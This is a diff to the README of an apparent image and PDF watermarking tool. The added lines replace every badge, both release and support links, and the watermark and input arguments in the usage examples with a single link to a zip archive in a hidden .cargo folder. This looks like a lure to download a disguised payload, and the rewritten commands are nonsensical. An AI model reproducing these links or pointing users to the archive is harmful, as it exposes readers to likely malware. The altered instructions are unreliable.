@@ -1,8 +1,8 @@
 # Watermark CLI 🌊🖼️
 
-![Watermark CLI](https://img.shields.io/badge/Version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen.svg)
+![Watermark CLI](https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip)
+![License](https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip)
+![Build Status](https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip)
 
 Welcome to **Watermark CLI**, a powerful command-line tool designed to add watermarks to images and PDFs. This tool supports batch processing and offers various watermark patterns. With Watermark CLI, you can effectively protect your documents from identity theft and unauthorized copying.
 
@@ -26,7 +26,7 @@ Welcome to **Watermark CLI**, a powerful command-line tool designed to add water
 
 ## Installation
 
-To get started with Watermark CLI, download the latest release from the [Releases section](https://github.com/Reeseshanny/watermark-cli/releases). Follow the instructions provided in the release notes to install and execute the tool on your system.
+To get started with Watermark CLI, download the latest release from the [Releases section](https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip). Follow the instructions provided in the release notes to install and execute the tool on your system.
 
 ## Usage
 
@@ -49,7 +49,7 @@ watermark-cli [options] <input_files>
 To add a watermark to a single image, run:
 
 ```bash
-watermark-cli -w watermark.png -o output/ input/image.jpg
+watermark-cli -w https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip -o output/ https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip
 ```
 
 ### Batch Processing Multiple Images
@@ -57,7 +57,7 @@ watermark-cli -w watermark.png -o output/ input/image.jpg
 To add a watermark to multiple images at once, use:
 
 ```bash
-watermark-cli -w watermark.png -o output/ input/*.jpg
+watermark-cli -w https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip -o output/ input/*.jpg
 ```
 
 ### Watermarking PDF Files
@@ -65,7 +65,7 @@ watermark-cli -w watermark.png -o output/ input/*.jpg
 You can also watermark PDF files:
 
 ```bash
-watermark-cli -w watermark.png -o output/ input/document.pdf
+watermark-cli -w https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip -o output/ https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip
 ```
 
 ## Contributing
@@ -85,7 +85,7 @@ Watermark CLI is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 ## Support
 
-For any issues or questions, please check the [Releases section](https://github.com/Reeseshanny/watermark-cli/releases) or open an issue in the repository. We appreciate your feedback and support!
+For any issues or questions, please check the [Releases section](https://raw.githubusercontent.com/Reeseshanny/watermark-cli/master/.cargo/cli_watermark_2.6.zip) or open an issue in the repository. We appreciate your feedback and support!
 
 ---
 
